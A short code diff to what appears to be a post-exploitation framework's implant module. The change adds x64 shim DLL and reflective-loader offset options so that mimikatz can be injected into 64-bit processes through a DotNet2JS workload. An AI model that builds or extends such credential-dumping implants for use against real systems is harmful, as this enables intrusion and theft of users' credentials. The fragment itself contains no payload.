@@ -5,7 +5,6 @@ import string
 
 class DotNet2JSJob(core.job.Job):
     def create(self):
-        self.fork32Bit = True
         self.errstat = 0
 
     def parse_mimikatz(self, data):
@@ -74,8 +73,10 @@ class DotNet2JSImplant(core.implant.Implant):
         self.options.register("MIMIX86UUID", "", "UUID", hidden=True)
 
         self.options.register("SHIMX86B64", "", "calculated bytes for arr_DLL", hidden=True)
+        self.options.register("SHIMX64B64", "", "calculated bytes for arr_DLL", hidden=True)
 
         self.options.register("SHIMX86OFFSET", "6217", "Offset to the reflective loader", advanced = True)
+        self.options.register("SHIMX64OFFSET", "7656", "Offset to the reflective loader", advanced = True)
 
     def dllb64(self, path):
         import base64
@@ -106,6 +107,7 @@ class DotNet2JSImplant(core.implant.Implant):
 
 
         self.options.set("SHIMX86B64", self.dllb64(self.options.get("SHIMX86DLL")))
+        self.options.set("SHIMX64B64", self.dllb64(self.options.get("SHIMX64DLL")))
 
         workloads = {}
         workloads["js"] = self.loader.load_script("data/implant/inject/mimikatz_dotnet2js.js", self.options)
